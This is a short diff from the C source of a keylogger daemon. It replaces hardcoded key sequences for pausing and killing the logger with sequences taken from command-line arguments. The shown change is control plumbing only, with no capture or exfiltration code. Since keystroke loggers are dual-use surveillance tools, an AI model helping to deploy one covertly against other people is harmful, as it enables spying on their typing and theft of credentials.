@@ -40,39 +40,23 @@ void keyloggerd(cmd_args_t cmd_args)
         return;
     }
 
-    /*
-     * The sequence of keys to start and stop the key logger
-     */
-    static unsigned short start_stop_keys[] = {
-        KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
-    };
-
-    /*
-     * The sequence of keys to kill the keylogger daemon
-     */
-    static unsigned short kill_keys[] = {
-        KEY_ESC, KEY_ESC, KEY_ESC
-    };
-
-    keyseq_t start_stop_seq = {
-        .keys = start_stop_keys,
-        .size = ARRAY_SIZE(start_stop_keys),
-        .index = 0,
-        .callback = start_stop_callback,
-    };
-
     keyseq_t kill_seq = {
-        .keys = kill_keys,
-        .size = ARRAY_SIZE(kill_keys),
+        .keys = &cmd_args.seq.kill,
         .index = 0,
         .callback = kill_callback,
+    };
+
+    keyseq_t pause_resume_seq = {
+        .keys = &cmd_args.seq.pause_resume,
+        .index = 0,
+        .callback = start_stop_callback,
     };
 
     keylog_t *kl;
 
     kl = create_keylog(cmd_args);
 
-    kl->install_seq(kl, start_stop_seq);
+    kl->install_seq(kl, pause_resume_seq);
     kl->install_seq(kl, kill_seq);
 
     kl->open(kl);
